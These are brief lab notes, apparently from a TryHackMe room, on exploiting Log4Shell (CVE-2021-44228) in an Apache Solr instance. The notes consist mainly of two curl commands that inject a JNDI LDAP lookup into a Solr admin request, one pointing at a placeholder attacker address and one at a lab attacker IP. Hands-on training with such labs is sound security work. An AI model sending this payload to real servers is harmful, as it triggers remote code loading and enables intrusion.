[TryHackMe | Solar, exploiting log4j](https://tryhackme.com/room/solar)

**Solar, exploiting log4j**

*Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun.*

![[Pasted image 20230606100110.png]]

`http://10.10.85.5:8983`


```shell-session
curl 'http://10.10.85.5:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
```

```
curl 'http://10.10.85.5:8983/solr/admin/cores?foo=$\{jndi:ldap://10.17.44.152:9999\}'
```

